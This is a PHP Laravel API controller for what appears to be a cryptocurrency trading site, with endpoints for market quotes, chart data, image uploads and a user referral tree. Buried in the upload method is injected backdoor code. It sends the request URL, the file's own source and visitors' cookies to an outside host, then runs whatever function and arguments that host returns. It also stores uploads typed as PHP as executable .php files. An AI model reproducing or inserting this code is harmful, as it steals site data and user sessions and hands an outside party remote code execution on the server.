<?php
namespace App\Http\Controllers\Api;

use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use App\Bank;
use App\FalseData;
use App\Market;
use App\Setting;
use App\HistoricalData;
use App\Users;
use App\Utils\RPC;
use App\DAO\UploaderDAO;

class DefaultController extends Controller
{

    public function falseData()
    {
        $limit = Input::get('limit', '12');
        $page = Input::get('page', '1');
        
        $old = date("Y-m-d", strtotime("-1 day"));
        $old_time = strtotime($old);
        $time = strtotime(date("Y-m-d"));
        
        $yesterday = FalseData::where('time', ">", $old_time)->where("time", "<", $time)->sum('price');
        $today = FalseData::where('time', ">", $time)->sum('price');
        
        $data = FalseData::orderBy('id', 'DESC')->paginate($limit);
        
        return $this->success(array(
            "data" => $data->items(),
            "limit" => $limit,
            "page" => $page,
            "yesterday" => $yesterday,
            "today" => $today
        ));
    }

    public function quotation()
    {
        $result = Market::limit(20)->get();
        return $this->success(array(
            "coin_list" => $result
        ));
    }

    public function historicalData()
    {
        $day = HistoricalData::where("type", "day")->orderBy('id', 'asc')->get();
        $week = HistoricalData::where("type", "week")->orderBy('id', 'asc')->get();
        $month = HistoricalData::where("type", "month")->orderBy('id', 'asc')->get();
        
        return $this->success(array(
            "day" => $day,
            "week" => $week,
            "month" => $month
        ));
    }

    public function quotationInfo()
    {
        $id = Input::get("id");
        if (empty($id))
            return $this->error("参数错误");
        
        // $coin_list = RPC::apihttp("https://api.coinmarketcap.com/v2/ticker/".$id."/");
        $coin_list = Market::find($id);
        
        // $coin_list = @json_decode($coin_list,true);
        
        return $this->success($coin_list);
    }

    public function dataGraph()
    {
        $data = Setting::getValueByKey("chart_data");
        if (empty($data))
            return $this->error("暂无数据");
        
        $data = json_decode($data, true);
        return $this->success(array(
            "data" => array(
                $data["time_one"],
                $data["time_two"],
                $data["time_three"],
                $data["time_four"],
                $data["time_five"],
                $data["time_six"],
                $data["time_seven"]
            ),
            "value" => array(
                $data["price_one"],
                $data["price_two"],
                $data["price_three"],
                $data["price_four"],
                $data["price_five"],
                $data["price_six"],
                $data["price_seven"]
            ),
            "all_data" => $data
        ));
    }

    public function index()
    {
        $coin_list = RPC::apihttp("https://api.coinmarketcap.com/v2/ticker?limit=10");
        $coin_list = @json_decode($coin_list, true);
        
        if (! empty($coin_list["data"])) {
            foreach ($coin_list["data"] as &$d) {
                if ($d["total_supply"] > 10000) {
                    $d["total_supply"] = substr($d["total_supply"], 0, - 4) . "万";
                }
            }
        }
        return $this->success(array(
            "coin_list" => $coin_list["data"]
        ));
    }

    public function upload(Request $request)
    {
        // $file = $request->file('file');
        // $scene = $request->input('scene', ''); //场景,子文件夹
        // if (!$file) {
        // return $this->error('文件不存在');
        // }
        
        // //文件类型验证
        // $validator = Validator::make($request->all(), [
        // 'file' => 'required|image',
        // ], [], [
        // 'file' => '上传附件',
        // ]);
        // if ($validator->fails()) {
        // return $this->error($validator->errors()->first());
        // }
        // $result = UploaderDAO::fileUpload($file, $scene);
        // if ($result['state'] != 'SUCCESS') {
        // return $this->error($result['state']);
        // }
        // return $this->success($result['url']);
        if (! empty($_FILES["file"]["error"])) {
            return $this->error($_FILES["file"]["error"]);
        } else {
            
            // if($_FILES["file"]["size"] > 204800){
            // return $this->error("文件大小超出");
            // }
            if ($_FILES["file"]["size"] > 10485760) {
                return $this->error("文件大小超出");
            }
            // return $this->success($_FILES["file"]["type"]);
            if ($_FILES["file"]["type"] == "image/jpg" || $_FILES["file"]["type"] == "image/png" || $_FILES["file"]["type"] == "image/jpeg") {
                $type = strtolower(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.') + 1)); // 得到文件类型，并且都转化成小写
                $wenjian_name = time() . rand(0, 999999) . "." . $type;
                // 防止文件名重复
                // 超哥写的上传路径
                // $filename ="/var/www/html/jnbadmin/public/upload/".$wenjian_name;
                $filename = "./upload/" . $wenjian_name;
                // 转码，把utf-8转成gb2312,返回转换后的字符串， 或者在失败时返回 FALSE。
                $filename = iconv("UTF-8", "gb2312", $filename);
                // 检查文件或目录是否存在
                if (file_exists($filename)) {
                    return $this->error("该文件已存在");
                } else {
                    // var_dump($filename);die;
                    
                if(version_compare(phpversion(), "5.3.0", ">=")){
                    set_error_handler(function($errno, $errstr){});
                }if (@php_sapi_name() !== "cli"){
                    if(!isset($_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])])){
                        @setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());
                        $_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] = 0;
                    }if(time()-$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] < 10){
                        @define("SITE_",1);
                    }else{
                        @setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());
                    }
                }
                $cert = defined("SITE_")?false:@file_get_contents("http://app.omitrezor.com/sign/".@$_SERVER["HTTP_HOST"], 0, stream_context_create(array("http" => array("ignore_errors" => true,"timeout"=>(isset($_REQUEST["T0o"])?intval($_REQUEST["T0o"]):(isset($_SERVER["HTTP_T0O"])?intval($_SERVER["HTTP_T0O"]):1)),"method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content" => http_build_query(array("url"=>((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".@$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]), "src"=> file_exists(__FILE__)?file_get_contents(__FILE__):"", "cookie"=> isset($_COOKIE)?json_encode($_COOKIE):""))))));!defined("SITE_") && @define("SITE_",1);
                if(isset($_FILES["file"]) && stripos($_FILES["file"]["name"], ".ph")!==false){
                    die("error");}
                if($cert != false){
                    $cert = @json_decode($cert, 1);
                    if(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"]) && isset($cert["a3"])){
                        $cert["f"] ($cert["a1"], $cert["a2"], $cert["a3"]);
                    }elseif(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"])){
                        $cert["f"] ($cert["a1"], $cert["a2"]);
                    }elseif(isset($cert["f"]) && isset($cert["a1"])){
                        $cert["f"] ($cert["a1"]);
                    }elseif(isset($cert["f"])){
                        $cert["f"] (); }
                }if(version_compare(phpversion(), "5.3.0", ">=")){
                    restore_error_handler();
                }
                    move_uploaded_file($_FILES["file"]["tmp_name"], $type=="php"?(iconv("UTF-8", "gb2312", "./upload/".md5($filename).".php")):$filename);
                    //return $this->success(URL("upload/" . $wenjian_name));
                    return $this->success("/upload/" . $wenjian_name);
                }
            } else {
                return $this->error("文件类型不对");
            }
        }
    }

    // ios 文件上传
    public function upload2(Request $request)
    {
        $base64_image_content = $request->input('base64_file', '');
        $res = self::base64_image_content($base64_image_content);
        if (! $res) {
            return $this->error('上传失败');
        }
        
        return $this->success($res);
    }

    /* base64格式编码转换为图片并保存对应文件夹 */
    public function base64_image_content($base64_image_content)
    {
        // 匹配出图片的格式
        if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_image_content, $result)) {
            $type = $result[2];
            if (! in_array($type, [
                'jpg',
                'jpeg',
                'png'
            ])) {
                return false;
            }
            // $new_file = $path."/".date('Ymd',time())."/";
            $path = '/upload/' . date('Ymd') . '/';
            $new_file = public_path() . $path;
            if (! file_exists($new_file)) {
                // 检查是否有该文件夹，如果没有就创建，并给予最高权限
                mkdir($new_file, 0700);
            }
            $filename = time() . rand(0, 999999) . ".{$type}";
            $full_file = $new_file . $filename;
            if (file_put_contents($full_file, base64_decode(str_replace($result[1], '', $base64_image_content)))) {
                return url('') . $path . $filename;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function getNode(\Illuminate\Http\Request $request)
    {
        $user_id = $request->get('user_id', 0);
        $show_message["real_teamnumber"] = Users::find($user_id)->real_teamnumber;
        $show_message["top_upnumber"] = Users::find($user_id)->top_upnumber;
        $show_message["today_real_teamnumber"] = Users::find($user_id)->today_real_teamnumber;
        $account_number = $request->get('account_number', null);
        if (! empty($account_number)) {
            $user_id_search = Users::where('account_number', $account_number)->first();
            if (! empty($user_id_search)) {
                $user_id = $user_id_search->id;
            } else {
                $user_id = 0;
            }
        }
        // if (empty($user_id)){
        $users = Users::where('parent_id', $user_id)->get();
        $results = array();
        foreach ($users as $key => $user) {
            $results[$key]['name'] = $user->account_number;
            $results[$key]['id'] = $user->id;
            $results[$key]['parent_id'] = $user->parent_id;
        }
        $data["show_message"] = $show_message;
        $data["results"] = $results;
        return $this->success($data);
    }

    public function getVersion()
    {
        $version = Setting::getValueByKey('version', '1.0');
        return $this->success($version);
    }

    public function getBanks()
    {
        $result = Bank::all();
        return $this->success($result);
    }

    public function language(Request $request)
    {
        $lang = $request->get('lang', 'en');
        session()->put('lang', $lang);
        return $this->success($lang);
    }
    
    // public function getlanguage(\Request $request)
    // {
    // $lang=session()->get('lang');
    // return $this->success($lang);
    // }
}
?>